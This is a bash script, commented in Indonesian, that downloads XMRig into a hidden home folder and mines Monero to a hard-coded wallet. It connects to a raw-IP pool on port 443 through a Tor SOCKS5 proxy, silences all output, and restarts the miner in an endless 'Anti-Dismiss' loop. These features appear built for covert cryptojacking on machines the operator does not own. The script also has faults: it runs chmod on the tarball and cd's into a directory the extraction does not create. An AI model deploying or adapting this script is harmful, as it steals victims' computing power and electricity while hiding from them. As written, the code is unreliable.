#!/bin/bash

# === Konfigurasi ===
POOL="134.199.197.80:443"
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
WORKER="linux_$(hostname)_$RANDOM"
PROXY="socks5://127.0.0.1:9050"
THREADS=$(nproc)
USE_TLS=true

# === Setup Folder ===
mkdir -p ~/.xmrig
cd ~/.xmrig

# === Unduh XMRig (Linux x64) ===
if [ ! -f ./xmrig ]; then
  echo "[*] Downloading XMRig binary..."
  curl -LO https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-linux-x64.tar.gz
  tar -xzf xmrig-6.21.0-linux-x64.tar.gz --strip-components=1
  chmod +x xmrig-6.21.0-linux-x64.tar.gz
  cd xmrig-6.21.0-linux-x64
fi

# === Tulis Konfigurasi Langsung ===
cat > config.json <<EOF
{
  "autosave": false,
  "cpu": {
    "enabled": true,
    "priority": 5,
    "yield": true
  },
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET.$WORKER",
      "pass": "x",
      "keepalive": true,
      "tls": $USE_TLS,
      "socks5": "$PROXY"
    }
  ]
}
EOF

# === Anti-Dismiss Loop ===
echo "[*] Starting XMRig with Anti-Dismiss..."
while true; do
  ./xmrig -c config.json > /dev/null 2>&1
  echo "[!] Miner exited. Restarting in 5s..."
  sleep 5
done
